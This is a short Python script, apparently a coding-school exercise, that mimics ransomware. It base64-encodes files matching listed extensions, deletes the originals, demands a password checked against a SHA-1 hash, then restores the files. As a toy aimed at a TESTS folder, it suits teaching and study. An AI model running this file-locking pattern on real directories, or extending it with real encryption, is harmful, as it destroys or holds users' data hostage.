#!/usr/bin/python3
import os
import sys
import re
import base64
import hashlib


def list_of_targets(target_dir, targets=["betty"]):
    """
    Walk through the directory, looking for targets.
    If targets is 1 long, and is "betty", then decrypt
    """
    for root, dirs, files in os.walk(target_dir):
        if len(files) > 1:
            for target in targets:
                reg = "^(.*)[/.](" + re.escape(target) + ")$"
                for item in [os.path.join(root, f) for f in files]:
                    if re.search(reg, item, re.IGNORECASE):
                        if targets[0] != "betty":
                            encrypt_decrypt(item, True)
                        else:
                            encrypt_decrypt(item, False)

def encrypt_decrypt(item, encrypt=True):
    """
    Encrypt or decrypt the files with base64
    if encrypt is true, encrypt the files, else decrypt the files
    """
    print(item)
    dest_filename = item + ".betty" if encrypt is True else item[0:-6]
    with open(item, 'rb') as src:
        with open(dest_filename, 'wb') as dest:
            if encrypt == True:
                base64.encode(src, dest)
            else:
                base64.decode(src, dest)
    os.chmod(dest_filename, os.stat(item)[0])
    os.remove(item)

def check_pwd():
    """
    Check Decryption key
    Default: Holberton
    """
    usr_password = hashlib.sha1(bytes(input("Enter your password here\n").strip().encode('utf-8'))).hexdigest()
    if usr_password == "808f94d2847fb381839b4bbbd7cdf30804fd47ac":
        print("Got it")
        return(True)
    print("Nah, try again")
    return(False)

if __name__ == "__main__":
    """
    Build the list of file extensions
    """
    targets = []
    with open("toEncrypt.txt", 'r') as f:
        for line in f:
            targets.append(line.strip())
    encrypted_dir = sys.argv[1] if len(sys.argv) is not 1 else "TESTS"

    print("The following files were encrypted:")
    list_of_targets(encrypted_dir, targets)
    unlock = check_pwd()
    while unlock is not True:
        unlock = check_pwd()
    print("\nNow Decrypting:")
    list_of_targets(encrypted_dir)
    print("Be Safe!")
